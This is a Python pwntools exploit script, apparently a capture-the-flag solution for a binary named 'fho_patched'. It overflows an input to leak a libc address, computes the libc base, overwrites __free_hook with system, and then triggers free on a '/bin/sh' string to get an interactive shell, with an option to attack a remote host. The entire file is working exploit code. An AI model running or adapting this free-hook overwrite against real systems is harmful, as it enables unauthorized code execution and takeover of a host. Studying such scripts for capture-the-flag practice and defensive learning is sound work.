#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fho_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x093b
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():
    
    offset = 72
    io.sendafter(b":", b"a"*offset)
    io.recvuntil(b"a"*offset)
    leak = u64(io.recvn(7).strip().ljust(8, b"\x00")) - 231
    libc.address = leak - 0x21b10
    info("leak: %#x", leak)
    info("libc base: %#x", libc.address)

    where = libc.sym['__free_hook']
    what = libc.sym['system']

    io.recvuntil("write: ")
    io.sendline(str(where))
    io.recvuntil("With: ")
    io.sendline(str(what))

    sh = next(libc.search(b'/bin/sh\x00'))
    io.recvuntil(b"free: ")
    io.sendline(str(sh))


    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

